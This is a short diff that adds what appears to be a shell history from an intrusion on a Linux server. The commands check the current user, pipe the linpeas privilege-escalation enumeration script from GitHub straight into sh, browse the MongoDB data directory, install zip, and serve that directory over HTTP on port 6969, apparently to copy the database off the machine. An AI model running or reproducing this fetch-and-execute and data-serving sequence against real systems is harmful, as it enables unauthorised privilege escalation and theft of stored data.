@@ -1,0 +1,18 @@
+ls -la
+whoami
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+cd /data
+cd ~
+ls -al
+cd /
+ls
+cd /var/lib/mongodb/
+ls -la
+cd ../
+which zip
+apt install zip
+zip
+cd mongodb/
+python3
+python3 -m http.server 6969
+exit
